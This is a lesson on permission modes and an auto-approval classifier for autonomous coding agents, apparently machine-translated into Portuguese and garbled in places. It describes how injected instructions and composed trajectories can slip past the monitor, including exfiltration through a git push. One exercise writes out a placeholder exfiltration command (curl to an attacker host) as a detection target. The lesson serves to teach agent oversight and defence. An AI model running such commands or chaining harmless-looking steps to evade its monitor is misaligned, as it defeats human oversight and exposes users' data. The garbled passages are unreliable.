# Modos de autorização para agentes autônomos

> Uma escada de permissão  níveis graduados de autonomia de revisão-cada ação para aprovar-tudo  é como um arame governa o que um agente autônomo pode fazer sem pedir. Claude Code, o exemplo de trabalho desta lição, expõe seis modos: "plan" pergunta antes de cada ação, "default" (etiquetado "Manual" na interface) pergunta apenas para os riscos, "acceptEdits" auto-aprova arquivo escreve, mas ainda confirma execução de shell, e "bypassPermissions" aprova tudo. Modo automático  o `auto`O modo de autorização  substitui a aprovação por acção por um modelo de classificação separado que revisa cada acção antes de ser executada e bloqueia qualquer coisa que exceda o exigido pelo pedido.`max_turns`E ...`max_budget_usd`Disponibilidade de`auto`depende do plano, da habilitação org, do modelo e do provedor  e a Anthropic é explícita que o classificador não é suficiente sozinho.

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator), TypeScript
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 minutes

## O problema

Um agente de codificação autônomo em sua máquina é uma categoria de segurança distinta. A superfície de ataque é tudo o que o agente pode alcançar  sistema de arquivos, rede, credenciais, clipboard, qualquer guia de navegador, qualquer terminal aberto. Bruce Schneier e outros marcaram isso publicamente: agentes de uso de computadores não são uma "atização de recursos" de chatbots, são um novo tipo de ferramenta com um novo tipo de perfil de risco.

O sistema de permissão do Claude Code é a resposta da Anthropic. Em vez de um interruptor "autônomo / não autônomo", existem seis modos que abrangem uma escada de capacidade: plano → padrão → aceitarEdits → ... → bypassPermissões. Cada modo é um troco diferente entre velocidade e revisão por ação. O Modo Automático (março 2026) adiciona um modelo de classificação separado que afasta a aprovação do caminho crítico do usuário: revisa cada ação antes de executar e bloqueia qualquer coisa que exceda a solicitação.

A questão da engenharia: o que o sistema pega, o que perde e qual modo uma determinada tarefa realmente requer?

## O conceito

### Os seis modos de autorização

| Mode | Behavior | When to use |
|---|---|---|
| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
| `default` | Labeled "Manual" in the UI. Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `auto` | A separate classifier model reviews each action before it runs; blocks anything escalating beyond the request | Long-horizon unattended runs in a constrained workspace |
| `dontAsk` | Never prompts; actions not pre-approved by permission rules are denied | Ephemeral sandboxes, CI jobs, research scripts |
| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |

(Os nomes acima correspondem aos documentos públicos do código Claude; os rótulos da interface `default`como "Manual".)

### Modo automático em uma página

O Modo Automático (lançado em 24 de março de 2026) é o primeiro modo de permissão para delegar aprovação por ação a um modelo.

1. **A separate classifier model.**Revisão de cada ação proposta antes de ser executada, julgado em função da tarefa declarada e do estado atual da sessão, e bloqueia qualquer coisa que exceda o que a solicitação exigiu. Ações bloqueadas caem no usuário.
2. **Gated availability.**Se`auto`O modelo de oferta depende do plano, da organização, do modelo e do fornecedor.

Os controlos orçamentais estão ao lado do classificador:

- `max_turns` Iterações totais numa sessão.
- `max_budget_usd`- O limite de dólares que aborta a sessão.
- Limites de conta de ações por instrumento (não mais do que N `WebFetch`chamadas, etc.).

### O que o sistema capta

- Injecção imediata direta para a frente nas entradas da ferramenta, onde a instrução injetada apresenta uma forma de ação conhecida de risco.
- Loops de ferramentas repetitivas  o classificador pode ver a ação N+1 é quase idêntica à ação N, cinco vezes seguidas.
- Comandações de shell claramente fora do escopo numa sessão de edição de arquivos.

### O que o sistema pode perder

- **Subtle prompt injection**O sistema de injeção de prompt indireta não é uma vulnerabilidade totalmente corrigível (OpenAI preparation head, 2025, on browser agents  see Lesson 11).
- **Semantic-level misbehavior.**Cada ação individual pode parecer segura enquanto a trajetória composta é prejudicial.
- **Exfiltration through legitimate channels.**Escrever dados para um arquivo que você possui, então `git push`O processo de reestruturação de um banco público é uma sequência de acções autorizadas cuja composição é o problema.

### Enquadramento de visualização de pesquisa

A Anthropic enviou o Modo Automático como uma prévia de pesquisa. A documentação é explícita de que o classificador é uma camada, não uma solução: os utilizadores devem combinar o modo automático com orçamentos, permissões, espaços de trabalho isolados e auditorias de trajetórias (Lessões 1216). O enquadramento de pré-visualização também reflete a lacuna documentada entre avaliação e implementação (Lessão 1)  um classificador que passa avaliações offline pode se comportar de forma diferente em uma sessão real onde o contexto do usuário é ambíguo.

### Onde esta escada vive no seu fluxo de trabalho

- tarefa desconhecida: iniciar `plan`Ler o plano é mais barato do que recuar numa má corrida.
- Refactor conhecido: `acceptEdits`Salva muitos cliques de confirmação.
- Fase de fundo sem supervisão: `auto`apenas dentro de um espaço de trabalho cujo raio de explosão tenha medido (sem credenciais, sem montantes de produção, sem saída que não tenha optado).
- Containers efêmeres: `dontAsk`- Não .`bypassPermissions`É aceitável se e somente se o recipiente e as suas credenciais forem descartáveis.

```figure
autonomy-oversight
```

## Usá-lo

`code/main.py`Simula um classificador de revisão de ações como um pipeline de duas etapas  uma simplificação do ensino; o real `auto`O modo é apoiado por um modelo de classificador separado, não um contrato documentado de duas etapas. O estágio 1 é uma regra de palavras-chave barata sobre as ações propostas; o estágio 2 é um revisor de regra múltipla mais lento. O motorista alimenta em uma curta trajetória sintética (ações seguras, uma tentativa de injeção rápida, um ciclo repetitivo) e mostra onde o classificador pega e onde perde.

## Envia-o

`outputs/skill-permission-mode-picker.md`corresponde à descrição da tarefa com o modo de autorização adequado, limites orçamentais e isolamento necessário.

## Exercícios

1. Corra .`code/main.py`Que tipo de acção sintética nunca é marcada pela Etapa 1 mas sempre capturada pela Etapa 2?

2. Extender a regra do estágio 1 definida para capturar uma forma específica conhecida de forma ruim (por exemplo, `curl $ATTACKER/exfil`) Medir a taxa de falsos positivos na amostra de acção benigna.

3. Leia o documento "Como funciona o ciclo do agente" da Anthropic.`default`O que é que você precisa de abrir separadamente antes de correr`auto`sem supervisão?

4. Desenhar um orçamento de execução não supervisada de 24 horas: `max_turns`- Não .`max_budget_usd`- A justificação de cada número.

5. Descreva uma trajetória em que cada ação individual é aprovada pelo classificador, mas o comportamento composto é desalinhado. (Lessão 14 abrange como os interruptores de eliminação e os tokens canários tratam isso.)

## Termos-chave

| Term | What people say | What it actually means |
|---|---|---|
| Permission mode | "How much the agent can do" | One of six named policies controlling per-action approval |
| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
| auto | "Auto approvals" | Separate classifier model reviews each action; blocks escalation beyond the request |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| Stage 1 (simulator) | "Fast keyword check" | Cheap rule over proposed actions in `code/main.py` |
| Stage 2 (simulator) | "Deep review" | Slower multi-rule reviewer for flagged actions in `code/main.py` |
| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |

## Mais leitura

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) modos de autorização, orçamentos, formato de acção.
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) Modelo de execução de serviços gerenciados.
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) superfície de recurso e anúncio de modo automático.
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) a camada baseada na razão que forma os julgamentos dos classificadores.
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) Perspectiva interna sobre o projeto de permissões de longo horizonte.
